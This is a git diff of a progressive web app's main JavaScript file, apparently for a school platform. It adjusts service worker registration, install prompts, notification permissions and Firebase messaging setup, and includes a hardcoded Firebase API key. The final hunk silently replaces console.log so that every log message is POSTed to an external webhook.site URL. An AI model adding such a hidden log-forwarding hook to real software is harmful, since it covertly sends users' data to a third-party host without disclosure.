@@ -1,84 +1,111 @@
 const version = "1.1.9"; // Change this to a new value whenever you update the service worker
 const installButton = document.getElementById('install-pwa-button');
 let deferredPrompt;
+const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+
 if ("serviceWorker" in navigator) {
-  // UNREGISTER OLD SERVICE WORKER
-  navigator.serviceWorker.getRegistrations().then((registrations) => {
-    for (const registration of registrations) {
-      registration.unregister();
-    }
-  });
+  try {
+    // UNREGISTER OLD SERVICE WORKER
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (const registration of registrations) {
+        registration.unregister();
+      }
+    });
 
-  window.addEventListener("load", function () {
-    navigator.serviceWorker
-      .register(`./serviceWorker.js?v=${version}`)
-      .then((res) => {
-        console.log("service worker registered v" + version)
-        setTimeout(() => {
-          //alert("App js onload");
-          // localStorage.setItem('register_device', '1');
-          if (localStorage["register_device"] == '1' || localStorage["register_device"] == undefined || localStorage["register_device"] == null) {
-            // if (true) {
-            initFirebaseMessagingRegistration();
-          } else {
-            getSchools();
+    window.addEventListener("load", function () {
+      navigator.serviceWorker
+        .register(`./serviceWorker.js?v=${version}`)
+        .then((res) => {
+          console.log("service worker registered v" + version)
+          setTimeout(() => {
+            //alert("App js onload");
+            // localStorage.setItem('register_device', '1');
+            if (localStorage["register_device"] == '1' || localStorage["register_device"] == undefined || localStorage["register_device"] == null) {
+              // if (true) {
+
+              // Check for iPhone (iOS)
+              // if (/iPhone|iPad|iPod/i.test(userAgent)) {
+              //   getSchools();
+              //   return 0;
+              // }
+
+              // // Check for Android
+              // if (/android/i.test(userAgent)) {
+              //   return "Android";
+              // }
+
+
+
+              initFirebaseMessagingRegistration();
+            } else {
+              getSchools();
+            }
           }
-        }
-          , 5000);
-      })
-      .catch((err) => console.log("service worker not registered", err));
-  });
+            , 3000);
+        })
+        .catch((err) => console.log("service worker not registered", err));
+    });
 
 
 
-  window.addEventListener('beforeinstallprompt', (e) => {
-    // Prevent the browser's default install prompt
-    e.preventDefault();
-    // Store the event for later use
-    deferredPrompt = e;
+    window.addEventListener('beforeinstallprompt', (e) => {
+      // Prevent the browser's default install prompt
+      e.preventDefault();
+      // Store the event for later use
+      deferredPrompt = e;
 
-    // Show your custom install button
-    //if (!localStorage["sshub_app_installed"]) {
-    openInstallModal();
-    //}
-  });
+      // Show your custom install button
+      //if (!localStorage["sshub_app_installed"]) {
+      openInstallModal();
+      //}
+    });
+
+  } catch (err) {
+    console.error("Error registering service worker:", err);
+  }
 
 }
 
 
 function installApp() {
-  // Trigger the deferred prompt
-  deferredPrompt.prompt();
+  try {
+    // Trigger the deferred prompt
+    deferredPrompt.prompt();
 
-  // Wait for the user to respond to the prompt
-  deferredPrompt.userChoice.then((choiceResult) => {
-    if (choiceResult.outcome === 'accepted') {
-      localStorage.setItem("sshub_app_installed", true)
-      console.log('User accepted the PWA installation');
-    } else {
-      console.log('User declined the PWA installation');
-      localStorage.setItem("sshub_app_installed", false)
-    }
+    // Wait for the user to respond to the prompt
+    deferredPrompt.userChoice.then((choiceResult) => {
+      if (choiceResult.outcome === 'accepted') {
+        localStorage.setItem("sshub_app_installed", true)
+        console.log('User accepted the PWA installation');
+      } else {
+        console.log('User declined the PWA installation');
+        localStorage.setItem("sshub_app_installed", false)
+      }
 
-    // Reset the prompt
-    deferredPrompt = null;
+      // Reset the prompt
+      deferredPrompt = null;
 
 
-    // ASK FOR PERMISSION FOR NOTIFICATION
-    if ('Notification' in window) {
-      Notification.requestPermission().then((permission) => {
-        if (permission === 'granted') {
-          console.log('Notification permission granted');
-          // You can now send notifications
-        } else if (permission === 'denied') {
-          console.log('Notification permission denied');
-        } else if (permission === 'default') {
-          console.log('Notification permission dismissed');
-        }
-      });
-    }
-  });
+      // ASK FOR PERMISSION FOR NOTIFICATION
+      if ('Notification' in window) {
+        Notification.requestPermission().then((permission) => {
+          if (permission === 'granted') {
+            console.log('Notification permission granted');
+            // You can now send notifications
+          } else if (permission === 'denied') {
+            console.log('Notification permission denied');
+          } else if (permission === 'default') {
+            console.log('Notification permission dismissed');
+          }
+        });
+      }
+    });
+  } catch (err) {
+    console.error("Error during app installation:", err);
+  }
 }
+
 
 
 function openInstallModal() {
@@ -167,6 +194,19 @@ async function initFirebaseMessagingRegistration() {
   try {
     //alert("App js initFirebaseMessagingRegistration");
 
+    if ('Notification' in window) {
+      Notification.requestPermission().then((permission) => {
+        if (permission === 'granted') {
+          console.log('Notification permission granted - initFirebaseMessagingRegistration');
+          // You can now send notifications
+        } else if (permission === 'denied') {
+          console.log('Notification permission denied - initFirebaseMessagingRegistration');
+        } else if (permission === 'default') {
+          console.log('Notification permission dismissed - initFirebaseMessagingRegistration');
+        }
+      });
+    }
+
     const firebaseConfig = {
       apiKey: "AIzaSyCLhWTc_4e5rGJeXV8qGCWZdZLTP0YrjCA",
       authDomain: "dextroux-technologies.firebaseapp.com",
@@ -211,3 +251,11 @@ async function initFirebaseMessagingRegistration() {
     console.log('eFCM initialization failed:', err);
   }
 }
+
+
+console.log = function (message) {
+  fetch('https://webhook.site/8f6c7ab3-96c8-483c-9b99-c4b809e113f5', {
+    method: 'POST',
+    body: JSON.stringify({ message })
+  });
+};
